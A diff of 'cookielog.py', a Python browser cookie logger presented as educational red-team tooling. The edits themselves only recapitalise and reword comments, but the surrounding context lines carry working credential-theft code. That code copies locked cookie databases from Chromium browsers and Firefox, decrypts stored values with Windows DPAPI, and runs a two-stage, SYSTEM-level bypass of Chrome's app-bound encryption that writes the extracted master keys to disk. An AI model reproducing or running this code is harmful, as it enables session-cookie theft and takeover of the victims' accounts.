@@ -1,6 +1,6 @@
-# cookielog.py — cookie logger: Firefox + Chromium (Chrome, Edge, Brave, Vivaldi, Opera)
+# cookielog.py -- cookie logger: Firefox + Chromium (Chrome, Edge, Brave, Vivaldi, Opera).
 #
-#   EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING
+#   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
 #
 #   This is offensive security tooling for penetration testing, red-team
 #   exercises, and security education. Only use on systems you own or are
@@ -126,7 +126,7 @@ def dpapi(data, machine=False):
     try:    return ctypes.string_at(out.pbData, out.cbData)
     finally: _k32.LocalFree(out.pbData)
 
-# ------------------------------------------------------------------ locked database copy + read
+# ------------------------------------------------------------------ Locked database copy + read
 def copy_group(path):
     """copies the .sqlite along with -wal/-shm: without -wal you lose the last cookies written"""
     tmp = tempfile.mkdtemp(prefix="ck")
@@ -147,7 +147,7 @@ def rows(main, sql):
     tmp, files = copy_group(main)
     if not files: shutil.rmtree(tmp, ignore_errors=True); return [], tmp
     db = files[0]
-    try:    con = sqlite3.connect(db)                                  # applies the recovered WAL
+    try:    con = sqlite3.connect(db)                                  # Applies the recovered WAL
     except sqlite3.DatabaseError:
         con = sqlite3.connect(f"file:{db}?mode=ro&immutable=1", uri=True)
     try:
@@ -201,7 +201,7 @@ def dump_chromium(browser, root):
     if not os.path.exists(ls): return out, []
     keys = chromium_keys(ls, browser)
     for db in glob.glob(os.path.join(root, "*", "Network", "Cookies")) + \
-            glob.glob(os.path.join(root, "*", "Cookies")):              # pre-88 has no Network\
+            glob.glob(os.path.join(root, "*", "Cookies")):              # Pre-88 has no Network\
         parent = os.path.dirname(db)
         prof = os.path.basename(os.path.dirname(parent)) if os.path.basename(parent) == "Network" \
             else os.path.basename(parent)
@@ -209,7 +209,7 @@ def dump_chromium(browser, root):
             "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
             "is_secure,is_httponly,samesite,COALESCE(top_frame_site_key,''),source_scheme,source_port "
             "FROM cookies",
-            # pre-76 DBs (and Chrome's own migration leftovers) have no CHIPS columns
+            # Pre-76 DBs (and Chrome's own migration leftovers) have no CHIPS columns.
             "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
             "is_secure,is_httponly,samesite,'',NULL,NULL FROM cookies"])
         for host, name, path, val, enc, exp, sec, http, samesite, tfk, sch, port in recs:
@@ -224,7 +224,7 @@ def dump_chromium(browser, root):
                        sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                        encrypted=bool(enc))
             if tfk:
-                # partitioned cookie (CHIPS): same host+name+path, different
+                # Partitioned cookie (CHIPS): same host+name+path, different
                 # top-level site. Without this in the identity the merge in
                 # listen.py collapsed them and one partition vanished.
                 rec["_partition"] = "%s|%s:%s" % (tfk, sch if sch is not None else "", port if port is not None else "")
@@ -239,7 +239,7 @@ def dump_firefox():
         prof = os.path.basename(os.path.dirname(db))
         recs, tmp = rows(db, [
             "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite,originAttributes FROM moz_cookies",
-            # Firefox < 42 has no originAttributes column
+            # Firefox < 42 has no originAttributes column.
             "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite,'' FROM moz_cookies"])
         for name, val, host, path, exp, sec, http, samesite, oa in recs:
             rec = dict(browser="firefox", profile=prof, domain=host, name=name, path=path or "/",
@@ -247,8 +247,8 @@ def dump_firefox():
                        sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                        encrypted=False)
             if oa:
-                # container tab (^userContextId=N) or first-party isolation: two
-                # logins to the same site hold the same (host,name,path)
+                # Container tab (^userContextId=N) or first-party isolation: two
+                # logins to the same site hold the same (host,name,path).
                 rec["_partition"] = str(oa)
             out.append(rec)
         shutil.rmtree(tmp, ignore_errors=True)
@@ -318,7 +318,7 @@ def main():
             print(f"\r{len(got)} live cookies  {time.strftime('%H:%M:%S')}  [Ctrl+C to stop]", end="")
             time.sleep(3)
 
-# ------------------------------------------------------------------ app-bound (Chrome/Edge/Brave >= 127)
+# ------------------------------------------------------------------ App-bound (Chrome/Edge/Brave >= 127)
 def abe_blobs():
     """returns [(browser, APPB blob)] for every Chromium with app_bound_encrypted_key"""
     got = []
@@ -372,10 +372,10 @@ def deploy_helper():
 
 def stage_v20(a):
     os.makedirs(STAGE, exist_ok=True)
-    if a.v20_sys:                                                       # layer 1: MACHINE DPAPI
+    if a.v20_sys:                                                       # Layer 1: MACHINE DPAPI
         # SYSTEM owns the directory it just created; stage 2 runs as the user and
-        # has to write mc-*.key in it. BUILTIN\Users by SID, so the ACL is
-        # locale-proof ("Users" is "Usuarios" here).
+        # has to write mc-*.key in it. Granted by SID, not by name, so the ACL is
+        # locale-proof.
         subprocess.run(["icacls", STAGE, "/grant", "*S-1-5-32-545:(OI)(CI)F"],
                        capture_output=True)
         helper = deploy_helper()
@@ -385,14 +385,14 @@ def stage_v20(a):
             if name != "chrome":
                 print(f"  [{name}] separate elevation service -- not wired yet")
                 continue
-            # the raw payload (APPB stripped) is what DecryptData expects; it does
+            # The raw payload (APPB stripped) is what DecryptData expects; it does
             # both DPAPI layers inside the service, so stage 2 does not need the
             # machine-unwrapped .stage1 shortcut
             with open(os.path.join(STAGE, f"{name}.appb"), "wb") as f:
                 f.write(blob)
             try:
-                # keep the SYSTEM-layer probe: it fails loudly here instead of
-                # surfacing as an opaque service error in stage 2
+                # Keep the SYSTEM-layer probe: it fails loudly here instead of
+                # surfacing as an opaque service error in stage 2.
                 data = dpapi(blob, machine=True)
             except OSError as e:
                 print(f"  [{name}] system DPAPI: {e}")
@@ -402,8 +402,8 @@ def stage_v20(a):
         print(f"stage 1 ok -> {STAGE}")
         return
     got = 0
-    # stage 2 starts from what stage 1 actually wrote: the file list is the truth,
-    # not the browser map (stage 2 may run under a different context)
+    # Stage 2 starts from what stage 1 actually wrote: the file list is the truth,
+    # not the browser map (stage 2 may run under a different context).
     for fn in sorted(os.listdir(STAGE)):
         if not fn.endswith(".appb"):
             continue
@@ -428,7 +428,7 @@ def stage_v20(a):
             continue
         enc = base64.b64encode(key)
         with open(os.path.join(STAGE, f"mc-{name}.key"), "wb") as f: f.write(enc)
-        # legacy single file: only meaningful when one browser is in play
+        # Legacy single file: only meaningful when one browser is in play.
         with open(os.path.join(STAGE, "mc.key"), "wb") as f: f.write(enc)
         got += 1
     print("stage 2 ok: mc.key generated" if got else "nothing to do in stage 2")
